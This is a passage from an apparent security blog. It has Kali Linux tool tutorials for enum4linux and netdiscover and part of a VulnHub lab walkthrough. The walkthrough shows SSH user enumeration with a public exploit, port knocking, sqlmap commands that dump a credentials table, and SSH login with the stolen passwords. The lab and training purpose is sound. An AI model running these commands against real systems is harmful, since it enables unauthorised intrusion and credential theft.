-P        get password policy information
-G        get group and member list
-d        be detailed, applies to -U and -S
-u user   specify username to use (default "")  
-p pass   specify password to use (default "")   
</code></pre>

<p>The following options from enum.exe aren&rsquo;t implemented: -L, -N, -D, -f</p>

<p>Additional options:</p>

<pre><code>-a        Do all simple enumeration (-U -S -G -P -r -o -n -i).
          This opion is enabled if you don't provide any other options.
-h        Display this help message and exit
-r        enumerate users via RID cycling
-R range  RID ranges to enumerate (default: 500-550,1000-1050, implies -r)
-K n      Keep searching RIDs until n consective RIDs don't correspond to
          a username.  Impies RID range ends at 999999. Useful 
      against DCs.
-l        Get some (limited) info via LDAP 389/TCP (for DCs only)
-s file   brute force guessing for share names
-k user   User(s) that exists on remote system (default: administrator,guest,krbtgt,domain admins,root,bin,none)
          Used to get sid with "lookupsid known_username"
          Use commas to try several users: "-k admin,user1,user2"
-o        Get OS information
-i        Get printer information
-w wrkg   Specify workgroup manually (usually found automatically)
-n        Do an nmblookup (similar to nbtstat)
-v        Verbose.  Shows full commands being run (net, rpcclient, etc.)
</code></pre>

<p>RID cycling should extract a list of users from Windows (or Samba) hosts
which have RestrictAnonymous set to 1 (Windows NT and 2000), or &ldquo;Network
access: Allow anonymous SID/Name translation&rdquo; enabled (XP, 2003).</p>

<p>NB: Samba servers often seem to have RIDs in the range 3000-3050.</p>

<p>Dependancy info: You will need to have the samba package installed as this
script is basically just a wrapper around rpcclient, net, nmblookup and
smbclient.  Polenum from <a href="http://labs.portcullis.co.uk/application/polenum/">http://labs.portcullis.co.uk/application/polenum/</a>
is required to get Password Policy info.
```</p>

<h2>enum4linux usage</h2>

<ul>
<li>get everything you can from a host without any credentials</li>
</ul>


<p>```
enum4linux 192.168.217.131
Starting enum4linux v0.8.9 ( <a href="http://labs.portcullis.co.uk/application/enum4linux/">http://labs.portcullis.co.uk/application/enum4linux/</a> ) on Mon Jun 19 10:06:33 2017</p>

<p> ==========================
|    Target Information    |
 ==========================
Target &hellip;&hellip;&hellip;.. 192.168.217.131
RID Range &hellip;&hellip;.. 500-550,1000-1050
Username &hellip;&hellip;&hellip; &lsquo;&rsquo;
Password &hellip;&hellip;&hellip; &lsquo;&rsquo;
Known Usernames .. administrator, guest, krbtgt, domain admins, root, bin, none</p>

<p> =======================================================
|    Enumerating Workgroup/Domain on 192.168.217.131    |
 =======================================================
[E] Can&rsquo;t find workgroup/domain</p>

<p> ===============================================
|    Nbtstat Information for 192.168.217.131    |
 ===============================================
Looking up status of 192.168.217.131
No reply from 192.168.217.131</p>

<p> ========================================
|    Session Check on 192.168.217.131    |
 ========================================
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 437.
[+] Server 192.168.217.131 allows sessions using username &lsquo;&rsquo;, password &lsquo;&rsquo;
[+] Got domain/workgroup name: SAMBA</p>

<p> ==============================================
|    Getting domain SID for 192.168.217.131    |
 ==============================================
Domain Name: SAMBA
Domain Sid: (NULL SID)
[+] Can&rsquo;t determine if host is part of domain or part of a workgroup</p>

<p> =========================================
|    OS information on 192.168.217.131    |
 =========================================
[+] Got OS info for 192.168.217.131 from smbclient: Domain=[SAMBA] OS=[Windows 6.1] Server=[Samba 4.4.4]
[+] Got OS info for 192.168.217.131 from srvinfo:</p>

<pre><code>LOCALHOST      Wk Sv PrQ Unx NT SNT Samba File Server
platform_id     :   500
os version      :   6.1
server type     :   0x809a03
</code></pre>

<p> ================================
|    Users on 192.168.217.131    |
 ================================
index: 0x1 RID: 0x3e8 acb: 0x00000010 Account: smbuser  Name: Samba access is allowed for this user Desc:</p>

<p>user:[smbuser] rid:[0x3e8]</p>

<p> ============================================
|    Share Enumeration on 192.168.217.131    |
 ============================================
WARNING: The &ldquo;syslog&rdquo; option is deprecated
Domain=[SAMBA] OS=[Windows 6.1] Server=[Samba 4.4.4]
Domain=[SAMBA] OS=[Windows 6.1] Server=[Samba 4.4.4]</p>

<pre><code>Sharename       Type      Comment
---------       ----      -------
sharename       Disk      Only authorized users
IPC$            IPC       IPC Service (Samba File Server)

Server               Comment
---------            -------

Workgroup            Master
---------            -------
</code></pre>

<p>[+] Attempting to map shares on 192.168.217.131
//192.168.217.131/sharename Mapping: DENIED, Listing: N/A
//192.168.217.131/IPC$  Mapping: OK Listing: DENIED</p>

<p> =======================================================
|    Password Policy Information for 192.168.217.131    |
 =======================================================
[E] Unexpected error from polenum:
Traceback (most recent call last):
  File &ldquo;/usr/bin/polenum&rdquo;, line 33, in <module></p>

<pre><code>from impacket.dcerpc import dcerpc_v4, dcerpc, transport, samr
</code></pre>

<p>ImportError: cannot import name dcerpc_v4
[+] Retieved partial password policy with rpcclient:</p>

<p>Password Complexity: Disabled
Minimum Password Length: 5</p>

<p> =================================
|    Groups on 192.168.217.131    |
 =================================</p>

<p>[+] Getting builtin groups:</p>

<p>[+] Getting builtin group memberships:</p>

<p>[+] Getting local groups:</p>

<p>[+] Getting local group memberships:</p>

<p>[+] Getting domain groups:</p>

<p>[+] Getting domain group memberships:</p>

<p> ==========================================================================
|    Users on 192.168.217.131 via RID cycling (RIDS: 500-550,1000-1050)    |
 ==========================================================================
[I] Found new SID: S-1-22-1
[I] Found new SID: S-1-5-21-3832469351-2479326917-463392201
[I] Found new SID: S-1-5-32
[+] Enumerating users using SID S-1-5-21-3832469351-2479326917-463392201 and logon username &lsquo;&rsquo;, password &lsquo;&rsquo;
S-1-5-21-3832469351-2479326917-463392201-500 <em>unknown</em>*unknown<em> (8)
S-1-5-21-3832469351-2479326917-463392201-501 LOCALHOST\nobody (Local User)
[&hellip;]
S-1-5-21-3832469351-2479326917-463392201-513 LOCALHOST\None (Domain Group)
S-1-5-21-3832469351-2479326917-463392201-1000 LOCALHOST\smbuser (Local User)
[+] Enumerating users using SID S-1-22-1 and logon username &lsquo;&rsquo;, password &lsquo;&rsquo;
S-1-22-1-1000 Unix User\nixhat (Local User)
S-1-22-1-1001 Unix User\smbuser (Local User)
[+] Enumerating users using SID S-1-5-32 and logon username &lsquo;&rsquo;, password &lsquo;&rsquo;
S-1-5-32-500 </em>unknown<em>*unknown</em> (8)
[&hellip;]
S-1-5-32-544 BUILTIN\Administrators (Local Group)
S-1-5-32-545 BUILTIN\Users (Local Group)
S-1-5-32-546 BUILTIN\Guests (Local Group)
S-1-5-32-547 BUILTIN\Power Users (Local Group)
S-1-5-32-548 BUILTIN\Account Operators (Local Group)
S-1-5-32-549 BUILTIN\Server Operators (Local Group)
S-1-5-32-550 BUILTIN\Print Operators (Local Group)</p>

<p> ================================================
|    Getting printer info for 192.168.217.131    |
 ================================================
No printers returned.</p>

<p>enum4linux complete on Mon Jun 19 10:07:15 2017
```</p>

<p>I edited some not found output for sanity, but you can see that even without any previous information, we were able to gather quite a few pieces, like the workgroup name, the server version, and the existing shares and users</p>

<ul>
<li>perform some enumeration while also showing the commands being run</li>
</ul>


<p>```
enum4linux -n -v 192.168.217.140
[V] Dependent program &ldquo;nmblookup&rdquo; found in /usr/bin/nmblookup
[V] Dependent program &ldquo;net&rdquo; found in /usr/bin/net
[V] Dependent program &ldquo;rpcclient&rdquo; found in /usr/bin/rpcclient
[V] Dependent program &ldquo;smbclient&rdquo; found in /usr/bin/smbclient
[V] Dependent program &ldquo;polenum&rdquo; found in /usr/bin/polenum
[V] Dependent program &ldquo;ldapsearch&rdquo; found in /usr/bin/ldapsearch
Starting enum4linux v0.8.9 ( <a href="http://labs.portcullis.co.uk/application/enum4linux/">http://labs.portcullis.co.uk/application/enum4linux/</a> ) on Mon Jun 19 10:50:48 2017</p>

<p> ==========================
|    Target Information    |
 ==========================
Target &hellip;&hellip;&hellip;.. 192.168.217.140
RID Range &hellip;&hellip;.. 500-550,1000-1050
Username &hellip;&hellip;&hellip; &lsquo;&rsquo;
Password &hellip;&hellip;&hellip; &lsquo;&rsquo;
Known Usernames .. administrator, guest, krbtgt, domain admins, root, bin, none</p>

<p> =======================================================
|    Enumerating Workgroup/Domain on 192.168.217.140    |
 =======================================================
[V] Attempting to get domain name with command: nmblookup -A &lsquo;192.168.217.140&rsquo;
[+] Got domain/workgroup name: WORKGROUP</p>

<p> ===============================================
|    Nbtstat Information for 192.168.217.140    |
 ===============================================
Looking up status of 192.168.217.140</p>

<pre><code>WIN-D7GA2J1M0TU &lt;00&gt; -         M &lt;ACTIVE&gt;  Workstation Service
WORKGROUP       &lt;00&gt; - &lt;GROUP&gt; M &lt;ACTIVE&gt;  Domain/Workgroup Name
WIN-D7GA2J1M0TU &lt;20&gt; -         M &lt;ACTIVE&gt;  File Server Service
WORKGROUP       &lt;1e&gt; - &lt;GROUP&gt; M &lt;ACTIVE&gt;  Browser Service Elections
WORKGROUP       &lt;1d&gt; -         M &lt;ACTIVE&gt;  Master Browser
..__MSBROWSE__. &lt;01&gt; - &lt;GROUP&gt; M &lt;ACTIVE&gt;  Master Browser

MAC Address = 00-0C-29-5C-13-CA
</code></pre>

<p> ========================================
|    Session Check on 192.168.217.140    |
 ========================================
[V] Attempting to make null session using command: smbclient -W &lsquo;WORKGROUP&rsquo; //&lsquo;192.168.217.140&rsquo;/ipc$ -U'&lsquo;%&rsquo;&lsquo; -c 'help&rsquo; 2>&amp;1
[+] Server 192.168.217.140 allows sessions using username &lsquo;&rsquo;, password &lsquo;&rsquo;</p>

<p> ==============================================
|    Getting domain SID for 192.168.217.140    |
 ==============================================
[V] Attempting to get domain SID with command: rpcclient -W &lsquo;WORKGROUP&rsquo; -U'&lsquo;%&rsquo;&lsquo; 192.168.217.140 -c 'lsaquery&rsquo; 2>&amp;1
could not initialise lsa pipe. Error was NT_STATUS_ACCESS_DENIED
could not obtain sid from server
error: NT_STATUS_ACCESS_DENIED
[+] Can&rsquo;t determine if host is part of domain or part of a workgroup
enum4linux complete on Mon Jun 19 10:50:48 2017
```</p>

<ul>
<li>get OS information</li>
</ul>


<p><code>
enum4linux -o 192.168.217.140
[...]
 =========================================
|    OS information on 192.168.217.140    |
 =========================================
[+] Got OS info for 192.168.217.140 from smbclient: Domain=[WIN-D7GA2J1M0TU] OS=[Windows 7 Ultimate 7601 Service Pack 1] Server=[Windows 7 Ultimate 6.1]
[E] Can't get OS info with srvinfo: NT_STATUS_ACCESS_DENIED
</code></p>

<ul>
<li>list shares on a server with credentials</li>
</ul>


<p>```
enum4linux -u Administrator -p Password123! -S 192.168.217.141
Starting enum4linux v0.8.9 ( <a href="http://labs.portcullis.co.uk/application/enum4linux/">http://labs.portcullis.co.uk/application/enum4linux/</a> ) on Mon Jun 19 12:40:55 2017</p>

<p> ==========================
|    Target Information    |
 ==========================
Target &hellip;&hellip;&hellip;.. 192.168.217.141
RID Range &hellip;&hellip;.. 500-550,1000-1050
Username &hellip;&hellip;&hellip; &lsquo;Administrator&rsquo;
Password &hellip;&hellip;&hellip; &lsquo;Password123!&rsquo;
Known Usernames .. administrator, guest, krbtgt, domain admins, root, bin, none</p>

<p> =======================================================
|    Enumerating Workgroup/Domain on 192.168.217.141    |
 =======================================================
[+] Got domain/workgroup name: SANGHELIOS0</p>

<p> ========================================
|    Session Check on 192.168.217.141    |
 ========================================
[+] Server 192.168.217.141 allows sessions using username &lsquo;Administrator&rsquo;, password &lsquo;Password123!&rsquo;</p>

<p> ==============================================
|    Getting domain SID for 192.168.217.141    |
 ==============================================
Domain Name: SANGHELIOS0
Domain Sid: S-1-5-21-1024350911-1337957381-1412282408
[+] Host is part of a domain (not a workgroup)</p>

<p> ============================================
|    Share Enumeration on 192.168.217.141    |
 ============================================
WARNING: The &ldquo;syslog&rdquo; option is deprecated
Domain=[SANGHELIOS0] OS=[Windows Server 2012 Datacenter 9200] Server=[Windows Server 2012 Datacenter 6.2]</p>

<pre><code>Sharename       Type      Comment
---------       ----      -------
ADMIN$          Disk      Remote Admin
C$              Disk      Default share
IPC$            IPC       Remote IPC
NETLOGON        Disk      Logon server share 
ops             Disk      
SYSVOL          Disk      Logon server share 
testshare       Disk      A share on Windows Server
</code></pre>

<p>Connection to 192.168.217.141 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
NetBIOS over TCP disabled &mdash; no workgroup available</p>

<p>[+] Attempting to map shares on 192.168.217.141
//192.168.217.141/ADMIN$    Mapping: OK, Listing: OK
//192.168.217.141/C$    [E] Can&rsquo;t understand response:
WARNING: The &ldquo;syslog&rdquo; option is deprecated
Domain=[SANGHELIOS0] OS=[Windows Server 2012 Datacenter 9200] Server=[Windows Server 2012 Datacenter 6.2]
  $Recycle.Bin                      DHS        0  Thu Jul 26 03:38:59 2012
  Boot                              DHS        0  Sun Oct 16 18:44:49 2016
  bootmgr                          AHSR   398156  Wed Jul 25 23:44:30 2012
  BOOTNXT                           AHS        1  Sat Jun  2 10:30:55 2012
  BOOTSECT.BAK                     AHSR     8192  Sun Oct 16 18:44:50 2016
  Documents and Settings            DHS        0  Thu Jul 26 03:14:09 2012
  pagefile.sys                      AHS 402653184  Mon Jun 19 12:08:41 2017
  PerfLogs                            D        0  Thu Jul 26 03:44:15 2012
  Program Files                      DR        0  Sun Oct 16 07:53:13 2016
  Program Files (x86)                 D        0  Thu Jul 26 04:04:58 2012
  ProgramData                        DH        0  Sun Oct 23 08:55:39 2016
  Recovery                          DHS        0  Sun Oct 16 07:48:22 2016
  StorageReports                      D        0  Sat Oct 22 17:17:58 2016
  System Volume Information         DHS        0  Sat Oct 22 17:17:27 2016
  testshare                           D        0  Mon Jun 19 12:25:50 2017
  Users                              DR        0  Sat Oct 22 16:06:28 2016
  Windows                             D        0  Sat Oct 22 16:49:16 2016</p>

<pre><code>    7863807 blocks of size 4096. 5348507 blocks available
</code></pre>

<p>//192.168.217.141/IPC$  Mapping: OK Listing: DENIED
//192.168.217.141/NETLOGON  Mapping: OK, Listing: OK
//192.168.217.141/ops   Mapping: OK, Listing: OK
//192.168.217.141/SYSVOL    Mapping: OK, Listing: OK
//192.168.217.141/testshare Mapping: OK, Listing: OK
```</p>

<p>Once you&rsquo;re on the same network as your target, enum4linux is a great resource to help in gathering information about the target, that you can later use for an attack.</p>

<p>```</p>

<hr />

<p>/ Your lucky number is 3552664958674928. \
\ Watch for it everywhere.               /</p>

<hr />

<pre><code>    \   ^__^
     \  (oo)\_______
        (__)\       )\/\
            ||----w |
            ||     ||
</code></pre>

<p>```</p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Netdiscover - Kali Linux tools]]></title>
    <link href="http://chousensha.github.io/blog/2017/06/16/netdiscover-kali-linux-tools/"/>
    <updated>2017-06-16T13:05:44-04:00</updated>
    <id>http://chousensha.github.io/blog/2017/06/16/netdiscover-kali-linux-tools</id>
    <content type="html"><![CDATA[<p><strong>Objective</strong>: a tool that can be used to perform ARP reconaissance and discover hosts on the local network. You could do that with Nmap too, but here netdiscover shines!</p>

<!-- more -->


<p>Homepage: <a href="https://github.com/alexxy/netdiscover">https://github.com/alexxy/netdiscover</a></p>

<h2>Netdiscover description</h2>

<blockquote><p>netdiscover is an  active/passive  arp  reconnaissance  tool,  initialy
developed  to  gain  information  about  wireless networks without dhcp
servers in wardriving scenarios.  It  can  also  be  used  on  switched
networks.  Built  on top of libnet and libpcap, it can passively detect
online hosts or search for them by sending arp requests.</p>

<p>Furthermore, it can be used to inspect your network&rsquo;s arp  traffic,  or
find network addresses using auto scan mode, which will scan for common
local networks.</p></blockquote>

<p>Manpage: <a href="http://manpages.ubuntu.com/manpages/precise/man8/netdiscover.8.html">http://manpages.ubuntu.com/manpages/precise/man8/netdiscover.8.html</a></p>

<h2>Netdiscover options</h2>

<p>```
Netdiscover 0.3-pre-beta7 [Active/passive arp reconnaissance tool]
Written by: Jaime Penalba <a href="&#109;&#97;&#x69;&#108;&#116;&#x6f;&#x3a;&#106;&#112;&#x65;&#110;&#97;&#x6c;&#x62;&#97;&#x65;&#x40;&#x67;&#x6d;&#97;&#x69;&#x6c;&#x2e;&#x63;&#111;&#x6d;">&#x6a;&#112;&#x65;&#110;&#x61;&#108;&#98;&#97;&#101;&#x40;&#x67;&#x6d;&#x61;&#x69;&#108;&#46;&#99;&#x6f;&#x6d;</a></p>

<p>Usage: netdiscover [-i device] [-r range | -l file | -p] [-m file] [-s time] [-n node] [-c count] [-f] [-d] [-S] [-P] [-c]
  -i device: your network device
  -r range: scan a given range instead of auto scan. 192.168.6.0/24,/16,/8
  -l file: scan the list of ranges contained into the given file
  -p passive mode: do not send anything, only sniff
  -m file: scan the list of known MACs and host names
  -F filter: Customize pcap filter expression (default: &ldquo;arp&rdquo;)
  -s time: time to sleep between each arp request (milliseconds)
  -n node: last ip octet used for scanning (from 2 to 253)
  -c count: number of times to send each arp reques (for nets with packet loss)
  -f enable fastmode scan, saves a lot of time, recommended for auto
  -d ignore home config files for autoscan and fast mode
  -S enable sleep time supression between each request (hardcore mode)
  -P print results in a format suitable for parsing by another program
  -N Do not print header. Only valid when -P is enabled.
  -L in parsable output mode (-P), continue listening after the active scan is completed</p>

<p>If -r, -l or -p are not enabled, netdiscover will scan for common lan addresses.
```</p>

<h2>Netdiscover usage</h2>

<p>Simply typing netdiscover at the terminal will launch its autoscan. The screen is interactive, and you can see new hosts as they appear.</p>

<ul>
<li>scan range</li>
</ul>


<p>```
netdiscover -r 192.168.217.0/24
Currently scanning: Finished!   |   Screen View: Unique Hosts</p>

<p> 3 Captured ARP Req/Rep packets, from 3 hosts.   Total size: 180</p>

<hr />

<p>   IP            At MAC Address     Count     Len  MAC Vendor / Hostname</p>

<hr />

<p> 192.168.217.1   00:50:56:c0:00:08      1      60  Unknown vendor                                                                                 <br/>
 192.168.217.2   00:50:56:fc:f6:8b      1      60  Unknown vendor                                                                                 <br/>
 192.168.217.254 00:50:56:f2:e2:e6      1      60  Unknown vendor   <br/>
```</p>

<ul>
<li>passive scan (don&rsquo;t send anything, just sniff)</li>
</ul>


<p>```
netdiscover -p
 Currently scanning: (passive)   |   Screen View: Unique Hosts</p>

<p> 2 Captured ARP Req/Rep packets, from 2 hosts.   Total size: 120</p>

<hr />

<p>   IP            At MAC Address     Count     Len  MAC Vendor / Hostname</p>

<hr />

<p> 192.168.217.2   00:50:56:fc:f6:8b      1      60  Unknown vendor                                                                                 <br/>
 192.168.217.138 00:0c:29:43:d4:3e      1      60  Unknown vendor    <br/>
```</p>

<p>This takes longer, because netdiscover is waiting to see the ARP requests and replies between other hosts</p>

<ul>
<li>fast scan</li>
</ul>


<blockquote><p>-f     Enable  fast  mode  scan. This will only scan for .1, .100 and .254 on each network. This mode is useful while
searching for ranges being used. After you found such range you can make a specific range scan to find online boxes.</p></blockquote>

<ul>
<li>produce parseable output and stop after scanning</li>
</ul>


<p>```
root@kali:~# netdiscover -r 192.168.217.0/24 -P</p>

<hr />

<p>   IP            At MAC Address     Count     Len  MAC Vendor / Hostname</p>

<hr />

<p> 192.168.217.1   00:50:56:c0:00:08      1      60  Unknown vendor
 192.168.217.2   00:50:56:fc:f6:8b      1      60  Unknown vendor
 192.168.217.138 00:0c:29:43:d4:3e      1      60  Unknown vendor
 192.168.217.254 00:50:56:f2:e2:e6      1      60  Unknown vendor</p>

<p>&mdash; Active scan completed, 4 Hosts found.
```</p>

<p>Cookie:</p>

<p>```</p>

<hr />

<p>/ F.S. Fitzgerald to Hemingway:        \
|                                      |
| &ldquo;Ernest, the rich are different from |
| us.&rdquo; Hemingway:                      |
|                                      |
\ &ldquo;Yes. They have more money.&rdquo;         /</p>

<hr />

<pre><code>    \   ^__^
     \  (oo)\_______
        (__)\       )\/\
            ||----w |
            ||     ||
</code></pre>

<p>```</p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Bow before the Lord of the Root]]></title>
    <link href="http://chousensha.github.io/blog/2017/06/12/bow-before-the-lord-of-the-root/"/>
    <updated>2017-06-12T11:08:37-04:00</updated>
    <id>http://chousensha.github.io/blog/2017/06/12/bow-before-the-lord-of-the-root</id>
    <content type="html"><![CDATA[<p>Back to looking through VulnHub&rsquo;s selection of virtual machines, I got hooked by the name of this one. The author intended for this machine to be similar in difficulty to those in the OSCP lab, so it&rsquo;s definitely good training if you&rsquo;re preparing to jump into the fray!</p>

<!-- more -->


<p>The port scan revealed only 1 open port:</p>

<p><code>
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 6.6.1p1 Ubuntu 2ubuntu2.3 (Ubuntu Linux; protocol 2.0)
</code></p>

<p>I also ran a UDP scan, but got nothing. I proceeded to google the SSH version, and got a hit quite fast. It appears that this OpenSSH version is vulnerable to <a href="https://www.ubuntu.com/usn/usn-3061-1/">CVE-2016-6210</a>, which allows users to be enumerated.</p>

<p>Luckily for us, there is an <a href="https://www.exploit-db.com/exploits/40136/">exploit</a> available.</p>

<p>```
python 40136.py -h
usage: 40136.py [-h] [-u USER | -U USERLIST] [-e] [-s] [&mdash;bytes BYTES]</p>

<pre><code>            [--samples SAMPLES] [--factor FACTOR] [--trials TRIALS]
            host
</code></pre>

<p>positional arguments:
  host                  Give SSH server address like ip:port or just by ip</p>

<p>optional arguments:
  -h, &mdash;help            show this help message and exit
  -u USER, &mdash;user USER  Give a single user name
  -U USERLIST, &mdash;userlist USERLIST</p>

<pre><code>                    Give a file containing a list of users
</code></pre>

<p>  -e, &mdash;enumerated      Only show enumerated users
  -s, &mdash;silent          Like -e, but just the user names will be written to</p>

<pre><code>                    stdout (no banner, no anything)
</code></pre>

<p>  &mdash;bytes BYTES         Send so many BYTES to the SSH daemon as a password
  &mdash;samples SAMPLES     Collect so many SAMPLES to calculate a timing baseline</p>

<pre><code>                    for authenticating non-existing users
</code></pre>

<p>  &mdash;factor FACTOR       Used to compute the upper timing boundary for user</p>

<pre><code>                    enumeration
</code></pre>

<p>  &mdash;trials TRIALS       try to authenticate user X for TRIALS times and</p>

<pre><code>                    compare the mean of auth timings against the timing
                    boundary
</code></pre>

<p>```</p>

<p>So you have to give the script a username or a list of users to enumerate. Well, we already know one user! If you glanced at the LordOfTheRoot VM after it booted, you probably noticed good old smeagol:</p>

<p><img class="center" src="/images/pentest/lordoftheroot/smeagol.png" title="&lsquo;smeagol&rsquo; &lsquo;smeagol&rsquo;" ></p>

<p>Ran the script with the smeagol username:</p>

<p>```
python 40136.py -u smeagol 192.168.217.136</p>

<p>User name enumeration against SSH daemons affected by CVE-2016-6210
Created and coded by 0_o (nu11.nu11 [at] yahoo.com), PoC by Eddie Harari</p>

<p>[<em>] Testing SSHD at: 192.168.217.136:22, Banner: SSH-2.0-OpenSSH_6.6.1p1 Ubuntu-2ubuntu2.3
[</em>] Getting baseline timing for authenticating non-existing users&hellip;&hellip;&hellip;&hellip;
[<em>] Baseline mean for host 192.168.217.136 is 0.0507569 seconds.
[</em>] Baseline variation for host 192.168.217.136 is 0.0110011491622 seconds.
[<em>] Defining timing of x &lt; 0.0837603474867 as non-existing user.
[</em>] Testing your users&hellip;
[+] smeagol &ndash; timing: 0.425467
```</p>

<p>We know there is a smeagol user on the box, but couldn&rsquo;t find any other exploit that might help in this situation. So I just tried SSH'ing into the box to see what happens:</p>

<p>```
ssh <a href="&#109;&#97;&#105;&#x6c;&#116;&#111;&#58;&#x73;&#109;&#x65;&#x61;&#x67;&#111;&#108;&#64;&#x31;&#x39;&#50;&#x2e;&#x31;&#54;&#56;&#46;&#x32;&#49;&#55;&#x2e;&#49;&#51;&#x36;">&#x73;&#109;&#x65;&#97;&#x67;&#x6f;&#108;&#x40;&#49;&#57;&#50;&#46;&#x31;&#x36;&#56;&#46;&#50;&#x31;&#55;&#x2e;&#49;&#x33;&#54;</a>
The authenticity of host &lsquo;192.168.217.136 (192.168.217.136)&rsquo; can&rsquo;t be established.
ECDSA key fingerprint is SHA256:XzDLUMxo8ifHi4SciYJYj702X3PfFwaXyKOS07b6xd8.
Are you sure you want to continue connecting (yes/no)? yes
Warning: Permanently added &lsquo;192.168.217.136&rsquo; (ECDSA) to the list of known hosts.</p>

<pre><code>                                              .____    _____________________________
                                              |    |   \_____  \__    ___/\______   \
                                              |    |    /   |   \|    |    |       _/
                                              |    |___/    |    \    |    |    |   \
                                              |_______ \_______  /____|    |____|_  /
                                                      \/       \/                 \/
</code></pre>

<p> <em><em><strong>  </strong>.                     <strong>     </strong></em></em><strong><em><strong><strong>      .</strong>                   .</strong></em> </strong><strong><strong><strong><strong><em>      </em></strong></strong></strong></strong><strong>       </strong>
|    |/ <em>| </em><em><strong>   </strong><strong>   </strong></em><em> |  | <strong> _   </strong></em><strong>/</strong><em><em><strong>|</strong>| </em></em><strong>   </strong><strong>    </strong>| <em>/ _</em>    <strong><em>/</em></strong>   _   <strong><strong><em>/ </em></strong></strong>/  |<em>  </em><em><strong><strong><strong><strong><em>
|      &lt;  /    \ /  _ _/ </em></strong>\|  |/ /  |    </strong>) _  </strong> \  |/ </strong> \ /    \  / <strong> |    |    | /  _ \   |    </strong>)</em> /    \   <strong>\/ </strong> _  <strong> \
|    |  \|   |  (  &lt;_> )  _</strong>|    &lt;   |     \   |  | \/  \  <strong><em>/|   |  \/ /</em>/ |    |    |(  &lt;<em>> )  |        \   |  \  | \  </em></strong>/|  | \/
|<em><em><strong>|</strong> _<strong>|  /_</strong></em>/ _<strong>  ></strong>|</em> \  _<strong>  /   |</strong>|  |<strong>|_</strong>  ><strong><em>|  /_</em></strong> |    |<em><strong><em>| _</em></strong>/  /</em><strong><strong><em>_  /</em></strong>|  /</strong>|  _<strong>  ></strong>|</p>

<pre><code>    \/    \/            \/     \/      \/                  \/     \/      \/                           \/     \/          \/
</code></pre>

<p>Easy as 1,2,3
<a href="&#109;&#97;&#105;&#108;&#116;&#111;&#58;&#x73;&#x6d;&#101;&#97;&#x67;&#x6f;&#108;&#64;&#49;&#57;&#50;&#x2e;&#49;&#54;&#56;&#46;&#50;&#49;&#x37;&#46;&#x31;&#x33;&#x36;">&#x73;&#109;&#101;&#x61;&#103;&#111;&#x6c;&#x40;&#x31;&#x39;&#x32;&#x2e;&#49;&#x36;&#x38;&#46;&#x32;&#49;&#x37;&#46;&#49;&#x33;&#54;</a>&rsquo;s password:
```</p>

<p>Woot, a banner with a hint! The knock part might reference port knocking, as I&rsquo;ve seen that in some previous challenges. And the ports seem to be mentioned already! I used Nmap to knock on ports 1,2 and 3:</p>

<p>```
nmap -r -p1,2,3 192.168.217.136</p>

<p>Starting Nmap 7.40 ( <a href="https://nmap.org">https://nmap.org</a> ) at 2017-06-12 12:31 EDT
Nmap scan report for 192.168.217.136
Host is up (0.00065s latency).
PORT  STATE    SERVICE
1/tcp filtered tcpmux
2/tcp filtered compressnet
3/tcp filtered compressnet
```</p>

<p>The <code>-r</code> option was necessary to scan the ports in consecutive order. After knocking, I ran the full Nmap scan again, and a web server now awaited me:</p>

<p><code>
1337/tcp open  http    Apache httpd 2.4.7 ((Ubuntu))
</code></p>

<p>I checked it out in the browser, and found this image:</p>

<p><img class="center" src="/images/pentest/lordoftheroot/willdo.jpeg" title="&lsquo;mordor&rsquo; &lsquo;take the ring to mordor&rsquo;" ></p>

<p>Ran exiftool and strings on the picture, didn&rsquo;t find anything. Next I went to the <em>/images</em> directory where the image was served from, and found 2 more. Downloaded them and put them through exiftool and strings, still no results. In the meantime, I had also fired up a directory bruteforce on the server, but that didn&rsquo;t get me anywhere either. So the next thing I tried was to see if there is a directory called smeagol on the web server. There wasn&rsquo;t, but I was presented this picture, one of the 3 images found:</p>

<p><img class="center" src="/images/pentest/lordoftheroot/hipster.jpg" title="&lsquo;hipster&rsquo; &lsquo;hipster&rsquo;" ></p>

<p>Further testing confirmed that this image acted as a 404 page. But when I looked at the source, I found a suspicious string in a comment:</p>

<p>```</p>

<!--THprM09ETTBOVEl4TUM5cGJtUmxlQzV3YUhBPSBDbG9zZXIh>
```

I put the string into a [multipurpose online decoder](https://encoder.mattiasgeniar.be/index.php) and got a base64 string out of it: <code>Lzk3ODM0NTIxMC9pbmRleC5waHA=</code>. Decoding it revealed a directory on the web server: <code>/978345210/index.php</code>. Going there, I found a login page!

<img class="center" src="/images/pentest/lordoftheroot/mordor.png" title="mordor" alt="mordor login">

Time for sqlmap! I had to play with it and tweak quite a bit, the default levels didn't report any injection vulnerability, and the scan took so long, I had to break the enumeration into manageable pieces:

``` 
sqlmap -u "http://192.168.217.136:1337/978345210/index.php" --method POST -o --level=5 --risk=3 --dbms=MySQL -p username --data="username=smeagol&password=precious&submit=+Login+" --current-db
```

First, I queried for the current DB in use. I also turned on all the optimizaton switches, raised testing levels, and started with the username parameter. And luckily, it was vulnerable:

``` 
current database:    'Webapp'
```

Next, I dumped the discovered database:

``` 
sqlmap -u "http://192.168.217.136:1337/978345210/index.php" --method POST -o --level=5 --risk=3 --dbms=MySQL -p username --data="username=smeagol&password=precious&submit=+Login+" -D Webapp --dump
[...]
Database: Webapp
Table: Users
[5 entries]
+----+----------+------------------+
| id | username | password         |
+----+----------+------------------+
| 1  | frodo    | iwilltakethering |
| 2  | smeagol  | MyPreciousR00t   |
| 3  | aragorn  | AndMySword       |
| 4  | legolas  | AndMyBow         |
| 5  | gimli    | AndMyAxe         |
+----+----------+------------------+
```

Now that I had usernames and passwords, it was time to test them on SSH! I started with smeagol, because it looked slightly different than the others :-) And I got in:

``` 
smeagol@LordOfTheRoot:~$ uname -a
Linux LordOfTheRoot 3.19.0-25-generic #26~14.04.1-Ubuntu SMP Fri Jul 24 21:18:00 UTC 2015 i686 i686 i686 GNU/Linux
```

So, especially for older machines, one of the first things I do is check the kernel version. Googling it actually yielded a [privilege escalation exploit](https://www.exploit-db.com/exploits/39166/) right away. I decided to save this approach for last, because the exploit wasn't known at the time of the VM release. Instead, I proceeded to some more conventional enumeration.


